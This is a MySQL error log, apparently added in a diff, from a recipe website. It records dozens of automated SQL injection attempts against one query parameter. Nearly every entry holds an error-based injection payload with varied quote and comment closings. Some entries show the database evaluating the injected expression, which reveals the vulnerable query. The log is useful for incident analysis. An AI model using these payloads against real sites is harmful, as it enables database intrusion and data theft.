+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" WHERE 2760=2760 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (E' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" WHERE 2760=2760 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x))-- HCmX=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:12
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' WHERE 9773=9773 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (E' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' WHERE 9773=9773 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x))-- daNY=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:12
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") WHERE 2960=2960 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") WHERE 2960=2960 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x))-- ItDN=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:12
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') WHERE 7691=7691 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') WHERE 7691=7691 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x))-- mBmR=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:09
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)) AND "Tcpl" LIKE "Tcpl=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:09
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4"))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)) AND ((("XoLL" LIKE "XoLL=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:09
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4")) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)) AND (("OcGX" LIKE "OcGX=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:08
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1)' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)) AND ("dEvD" LIKE "dEvD=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:08
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)) AND "MqBI"="MqBI=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:08
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4"))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)) AND ((("qqTK"="qqTK=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:08
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4")) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)) AND (("KIWW"="KIWW=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:07
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1)' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)) AND ("MFAn"="MFAn=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:07
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)) AND 'DRzp' LIKE 'DRzp=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:07
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)) AND ((('lsnS' LIKE 'lsnS=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:07
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4')) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)) AND (('UxOF' LIKE 'UxOF=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:06
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1)' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)) AND ('WTKX' LIKE 'WTKX=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:06
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)) AND 'QdGX'='QdGX=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:06
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)) AND ((('dCFI'='dCFI=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:06
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4')) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)) AND (('wRkT'='wRkT=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1)' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)) AND ('NvCm'='NvCm=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x))-- OQtw=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x))-- heUw=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1)' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x))-- XaGB=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`) WHERE 2504=2504 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4`) WHERE 2504=2504 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x))-- dWRh=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:04
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '` WHERE 2451=2451 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (E' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4` WHERE 2451=2451 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x))-- urXa=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:04
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'AS OmOI WHERE 9494=9494 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SEL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) AS OmOI WHERE 9494=9494 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x))-- lhWJ=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:04
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AS PDDh WHERE 2734=2734 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(S' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4)) AS PDDh WHERE 2734=2734 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x))-- voRY=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:04
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE 7806=7806 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 WHERE 7806=7806 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x))-- ENPD=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:03
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE 6352=6352 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) WHERE 6352=6352 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x))-- FCcr=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:03
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x))# APOE=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:03
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x))-- HDXf=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:03
+SQLSTATE[22003]: Numeric value out of range: 1690 DOUBLE value is out of range in 'exp(~((select `x`.`CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78)` from (select concat(0x716a627871,(select elt((8310 = 8310),1)),0x717a766b71,0x78) AS `CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78)`) `x`)))'
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x))=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:02
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1)' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)) AND (((9387=9387=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:02
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4)) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)) AND ((5469=5469=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:02
+SQLSTATE[22003]: Numeric value out of range: 1690 DOUBLE value is out of range in 'exp(~((select `x`.`CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78)` from (select concat(0x716a627871,(select elt((8310 = 8310),1)),0x717a766b71,0x78) AS `CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78)`) `x`)))'
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x)) AND (1478=1478=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:02
+SQLSTATE[22003]: Numeric value out of range: 1690 DOUBLE value is out of range in 'exp(~((select `x`.`CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78)` from (select concat(0x716a627871,(select elt((8310 = 8310),1)),0x717a766b71,0x78) AS `CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78)`) `x`)))'
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(8310=8310,1))),0x717a766b71,0x78))x))-- DByu=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:01
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' IN BOOLEAN MODE) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' IN BOOLEAN MODE) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:01
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") AS zYEv WHERE 2096=2096 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") AS zYEv WHERE 2096=2096 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- tcas=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:01
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AS JAAp WHERE 7475=7475 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') AS JAAp WHERE 7475=7475 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- OFTZ=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:01
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")) AS XeWQ WHERE 5325=5325 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4")) AS XeWQ WHERE 5325=5325 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- qKfx=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')) AS fpbw WHERE 3651=3651 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4')) AS fpbw WHERE 3651=3651 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- aXGV=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''+(SELECT 'pGhm' WHERE 5560=5560 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'+(SELECT 'pGhm' WHERE 5560=5560 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))))+'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''+(SELECT IDgk WHERE 7323=7323 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'+(SELECT IDgk WHERE 7323=7323 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))))+'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''||(SELECT 'sEJM' WHERE 7864=7864 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'||(SELECT 'sEJM' WHERE 7864=7864 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))))||'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:59
